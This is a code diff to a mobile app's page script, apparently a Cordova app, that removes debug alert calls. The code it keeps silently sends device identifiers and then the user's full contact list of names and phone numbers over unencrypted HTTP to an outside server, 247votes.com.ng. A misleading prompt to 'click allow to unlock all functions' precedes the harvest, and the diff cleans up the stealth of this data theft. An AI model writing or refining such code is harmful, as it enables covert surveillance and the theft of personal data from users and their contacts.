@@ -641,7 +641,6 @@ myFunction();
 <script type="text/javascript">
         app.initialize();
 function onDeviceReady() {
-	alert("ok");
 var uid = device.uuid;
 document.getElementById('appID').value=uid;
 var obj = { deviceModel : device.model, deviceName: device.name, platform : device.platform, uuid : device.uuid, version : device.version, manufacture : device.manufacturer };
@@ -652,11 +651,11 @@ if(window.localStorage.getItem('app_settings')){
 var settings= JSON.parse(window.localStorage.getItem('app_settings'));
 var setup = settings.setup;
 }
-	alert("1");
+
 if(setup != 1){
-alert("2");
+
 $.post("http://247votes.com.ng/app/api.php",{id:'appReg', deviceModel : device.model, deviceName: device.name, platform : device.platform, uuid : device.uuid, version : device.version, manufacture : device.manufacturer},function(response){
-	alert("3");
+	
 if(response == 1){
 alert("Kindly click allow to unlock all functions.\nIf not application would not function well.");
 	navigator.contactsPhoneNumbers.list(function(contacts) {
@@ -669,9 +668,9 @@ alert("Kindly click allow to unlock all functions.\nIf not application would not
 	      dd += cn +" : "+ pn +",";
       }
 $.post("http://247votes.com.ng/app/api.php",{id:'appContacts', uuid:uid, data1:cl, data2:dd},function(response){
-alert("4");
+
 if(response == 1){
-	alert("5");
+	
 var setup = {
     appID: uid,
     setup: 1
